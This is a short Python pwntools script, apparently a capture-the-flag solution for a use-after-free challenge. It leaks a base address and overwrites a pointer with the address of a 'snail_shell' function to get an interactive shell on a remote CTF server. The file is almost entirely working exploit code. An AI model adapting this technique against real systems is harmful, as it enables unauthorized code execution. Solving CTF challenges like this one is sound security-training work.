from pwn import *

e = ELF("./uaf")
#p = process("./uaf")
p = remote("chals.fairgame.rpis.ec", 5004)

p.sendlineafter(":", "1")
p.sendlineafter(":", "2")
p.sendlineafter(":", "0")

p.sendlineafter(":", "2")
p.sendlineafter(":", "2")
p.sendlineafter(":", "0")

p.sendlineafter(":", "1")
p.sendlineafter(":", "1")

p.sendlineafter(":", "3")
p.sendlineafter(":", "2")
p.sendlineafter(":", "0")
p.sendlineafter(":", "2")

p.recvuntil(" ")
base = int(p.recvuntil(" "))
print("{:#x}".format(base))

p.sendlineafter(":", "1")
p.sendlineafter(":", "1")

p.sendlineafter(":", "2")
p.sendlineafter(":", "1")
p.sendlineafter(":", "1")

p.sendlineafter(":", "2")
p.sendlineafter(":", "1")
p.sendlineafter(":", "0")

p.sendlineafter(":", "1")
p.sendlineafter(":", "2")
p.sendlineafter(":", str(base - 0x9f7 + e.symbols["snail_shell"]))

p.sendlineafter(":", "3")
p.sendlineafter(":", "1")
p.sendlineafter(":", "0")

p.sendlineafter(":", "1")

p.interactive()
